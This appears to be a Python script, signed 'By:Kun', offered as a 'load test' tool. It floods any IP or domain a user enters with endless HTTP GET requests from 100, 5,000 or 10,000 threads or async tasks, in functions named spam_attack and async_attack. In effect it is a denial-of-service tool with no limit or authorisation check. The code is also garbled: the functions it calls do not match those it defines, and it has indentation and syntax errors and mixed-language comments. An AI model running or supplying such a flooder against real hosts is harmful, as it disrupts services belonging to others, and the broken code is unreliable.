import requests
import threading
import os
import time
import asyncio
import aiohttp
from colorama import Fore, Style, init

init(autoreset=True)

banner = f"""
{Fore.CYAN}
        ══════════════════════════════════════════════════════════════════
        █▒▒  █▒▒█▒▒  █▒▒██▒▒    █▒▒██████▒▒ ███▒▒  █▒▒   ███████▒▒
        █▒▒ █▒▒ █▒▒  █▒▒█▒█▒▒   █▒▒█▒▒     █▒▒ █▒▒ █▒▒         █▒▒
        █▒▒█▒▒  █▒▒  █▒▒█▒▒█▒▒  █▒▒█▒▒    █▒▒   █▒▒█▒▒       █▒▒
        █▒█▒▒   █▒▒  █▒▒█▒▒ █▒▒ █▒▒█████▒▒█▒▒   █▒▒█▒▒      █▒▒
        █▒▒█▒▒  █▒▒  █▒▒█▒▒  █▒▒█▒▒█▒▒    █▒█████▒▒█▒▒     █▒▒
        █▒▒ █▒▒ █▒▒  █▒▒█▒▒   █▒█▒▒█▒▒    █▒▒   █▒▒█▒▒    █▒▒
        █▒▒  █▒▒██████▒▒█▒▒    ██▒▒█████▒▒█▒▒   █▒▒█████▒▒███████▒▒
                                                        
        ═════════════════════════════════════════════════════════════════
{Fore.LIGHTMAGENTA_EX}By:Kun{Style.RESET_ALL}
"""
print(banner)

def main_menu(): 
    while True: print(f"{Fore.YELLOW}1. Request Test") 
        print("2. Light Load Test (Without Installation)") 
        print("3. Advanced Load Test (k6)") 
        choice = input(f"{Fore.CYAN}Choose an option (1-3): ").strip()

        if choice == "1":
            request_test()
        elif choice == "2":
           load_test_menu()
        elif choice == "3":
           advanced_load_test()
        else:
            print(f"{Fore.RED}Invalid selection. Please try again.\n")

def spam_attack(target):
    def send():
        while True:
            try:
                response = requests.get(target, timeout=5)
                color = Fore.GREEN if response.status_code == 200 else Fore.RED
                print(f"{color}[{response.status_code}] {target}")
            except Exception as e:
                print(f"{Fore.RED}[error] {e}")
    for _ in range(100):
        threading.Thread(target=send, daemon=True).start()

def istek_testi():
    while True:
        print(f"{Fore.YELLOW}1. IP ile Test")
        print("2. Domain ile Test")
        choice = input(f"{Fore.CYAN}Choose an option (1-2): ").strip()

        if choice == "1":
            ip = input("IP enter the address: ").strip()
            if not ip.startswith("http"):
                ip = f"http://{ip}"
            spam_attack(ip)
            break
        elif choice == "2":
            domain = input("Domain enter the address: ").strip()
            if not domain.startswith("http"):
                domain = f"https://{domain}"
            spam_attack(domain)
            break
        else:
            print(f"{Fore.RED}Invalid selection. Try again.\n") 

def load_test_menu():
    while True:
        print(f"{Fore.YELLOW}Light Load Testing Options  :")
        print("1. syncron (Requests ile)")
        print("2. asyncron (aiohttp ile)")
        choice = input(f"{Fore.CYAN}Choose an option (1-2): ").strip()

      if choice in ["1", "2"]:
            while True:
                print(f"{Fore.YELLOW}1. IP ile Test")
                print("2. Domain ile Test")
                sub_choice = input(f"{Fore.CYAN}Choose an option (1-2): ").strip()
                if sub_choice == "1":
                    target = input("IP enter the address: ").strip()
                    if not target.startswith("http"):
                        target = f"http://{target}"
                    break
                elif sub_choice == "2":
                    target = input(enter the domain address: ").strip()
                    if not target.startswith("http"):
                        target = f"https://{target}"
                    break
                else:
                    print(f"{Fore.RED}Invalid selection. Try again.\ n")
            if choice == "1":
              loaded_spam_sync(target)
            else:
                asyncio.run(loaded_spam_async(target))
            break
        else:
            print(f"{Fore.RED}Invalid selection. Try again.\n")

def yuklu_spam_sync(target):
    print(f"{Fore.LIGHTGREEN_EX}Syncron starting load test... (to get out Ctrl+C)")
    def send():
        session = requests.Session()
        while True:
            try:
                response = session.get(target, timeout=3)
                color = Fore.GREEN if response.status_code == 200 else Fore.RED
                print(f"{color}[{response.status_code}] {target}")
            except Exception as e:
                print(f"{Fore.RED}[error] {e}")
    thread_count = 5000 # <== ANDA DAPAT MENGUBAH NOMOR THREAD DI SINI (UNTUK SINKRONISASI)
    
    for _ in range(thread_count):
        threading.Thread(target=send, daemon=True).start()
    while True:
        time.sleep(1)

async def async_attack(session, target):
    while True:
        try:
            async with session.get(target, timeout=3) as response:
                status = response.status
                color = Fore.GREEN if status == 200 else Fore.RED
                print(f"{color}[{status}] {target}")
        except Exception as e:
            print(f"{Fore.RED}[error] {e}")
      wait asyncio.sleep(0)  # give up control

async def loaded_spam_async(target):
    print(f"{Fore.LIGHTGREEN_EX}Starting asynchronous load test... (to get out Ctrl+C)")
    async with aiohttp.ClientSession() as session:
        tasks = []
        concurrency = 10000  # <== ANDA DAPAT MENGUBAH JUMLAH TUGAS CONCUREN DI SINI (UNTUK ASINKRONUS)
        for _ in range(concurrency):
            task = asyncio.create_task(async_attack(session, target))
            tasks.append(task)
        await asyncio.gather(*tasks)

def advanced_load_test():
    print(f"{Fore.YELLOW}This feature uses the k6 tool and external requires installation.")
    print(f"{Fore.CYAN}setup: npm install -g k6")
    print(f"{Fore.CYAN}Example command: k6 run script.js")
    print(f"{Fore.MAGENTA}This section is for non-terminal use.works.\n")

if __name__ == "__main__":
    main_menu()
    

